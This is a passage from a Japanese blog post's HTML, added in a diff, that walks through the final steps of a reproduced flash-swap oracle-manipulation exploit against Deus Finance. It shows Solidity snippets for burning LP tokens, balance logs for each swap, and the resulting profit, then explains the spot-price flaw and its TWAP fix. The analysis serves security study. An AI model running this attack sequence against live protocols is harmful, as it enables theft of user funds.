+    <a href="#6--lp%e3%83%88%e3%83%bc%e3%82%af%e3%83%b3%e3%81%aeburn" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    6 ) LPトークンのburn
+</h5>
+<p>清算したことで得られたLPトークンをburnし、USDCとDEIを得ます。</p>
+<p><a href="https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/how-uniswap-works">https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/how-uniswap-works</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="c1">// prepare the LP burning
+</span><span class="c1"></span><span class="n">ERC20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">sAMMUsdcDei</span><span class="p">)).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">sAMMUsdcDei</span><span class="p">),</span> <span class="n">sAMMUsdcDei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">me</span><span class="p">));</span>
+
+<span class="c1">// burn the LP
+</span><span class="c1"></span><span class="n">sAMMUsdcDei</span><span class="p">.</span><span class="n">burn</span><span class="p">(</span><span class="n">me</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>my LP token balance</code>が0になり、<code>my USDC balance</code> / <code>my DEI balance</code>が増加していることが分かります。</p>
+<pre><code>    [+] (6) remove liquidity
+    [+]      my USDC balance: 5218173124837
+    [+]      my DEI balance: 7617204163068582172512381
+    [+]      my LP token balance: 0
+</code></pre><h5 id="7--usdcをdeiへスワップ">
+    <a href="#7--usdc%e3%82%92dei%e3%81%b8%e3%82%b9%e3%83%af%e3%83%83%e3%83%97" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    7 ) USDCをDEIへスワップ
+</h5>
+<p>フラッシュローンの返却のため、USDCをDEIへスワップします。</p>
+<p>ログにより、<code>my USDC balance</code>が0に、<code>my DEI balance</code>が増えていることが確認できます。</p>
+<pre><code>    [+] (7) swap USDC to DEI from sAMM pool
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 12787419360961504871925327
+</code></pre><h5 id="8--ステップ1でフラッシュスワップしたものを返却">
+    <a href="#8--%e3%82%b9%e3%83%86%e3%83%83%e3%83%971%e3%81%a7%e3%83%95%e3%83%a9%e3%83%83%e3%82%b7%e3%83%a5%e3%82%b9%e3%83%af%e3%83%83%e3%83%97%e3%81%97%e3%81%9f%e3%82%82%e3%81%ae%e3%82%92%e8%bf%94%e5%8d%b4" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    8 ) ステップ1でフラッシュスワップしたものを返却
+</h5>
+<p>これで、借りたDEI以上の資金を用意できたため、フラッシュスワップが正常に終了します。</p>
+<pre><code>    [+] (8) exit the flash swap from spirit pool
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 3018770729245407709894965
+</code></pre><h5 id="9--deiをusdcへスワップ">
+    <a href="#9--dei%e3%82%92usdc%e3%81%b8%e3%82%b9%e3%83%af%e3%83%83%e3%83%97" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    9 ) DEIをUSDCへスワップ
+</h5>
+<p>最終的に、3064570164495ドルが得られます。</p>
+<pre><code>    [+] (9) swap DEI to USDC from sAMM pool
+    [+]      my USDC balance: 3064570164495
+    [+]      my DEI balance: 0
+</code></pre><h4 id="修正">
+    <a href="#%e4%bf%ae%e6%ad%a3" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    修正
+</h4>
+<p>今回の問題は、DEIの現在価格が、USDC / DEIのプールの現在の残高から導き出されてしまうことに問題がありました。</p>
+<p>そのような実装になっていたため、フラッシュスワップでの大規模な借り入れが発生すると、DEIの現在価格が低く計算されてしまっていました。</p>
+<p>そのためDeus Financeでは、Time-Weighted Average Price (TWAP)という時間加重平均を用いた価格算出ロジックに変更することで修正されました。</p>
+<p><a href="https://github.com/deusfinance/lending-audit/blob/ed8f4f844235d34252e806f749f99ac46187950a/contracts/Oracle.sol#L85-L91">Oracle.sol#L85-L91</a></p>
+<p><a href="https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles">Oracles | Uniswap</a></p>
+
+    </div>
+</div>
+
+<div class="container">
+    
+    <nav class="flex container suggested">
+        
+        <a rel="prev" href="/post/2021-07-21-rpo/" title="Previous post (older)">
+            <span>Previous</span>
+            RPOとOpenRedirectを用いたXSS
+            </a>
+        
+        
+        
+    </nav>
+    
+</div>
+ 
+<div class="container">
+    
+</div>
+
+</main>
+
+
+        </main>
+        <footer class="footer flex">
+    <section class="container">
+        <nav class="footer-links">
+            
+            <a href="/index.xml">RSS</a>
+            
+        </nav>
+
+        
+    </section>
+    <script defer src="/ts/features.c81551cd4dbef120af278f16966a41142c02be9ff5d6a669be09820fbf047456.js" 
+    data-enable-footnotes="true"
+    ></script>
+</footer>
+
+    </body>
+</html>
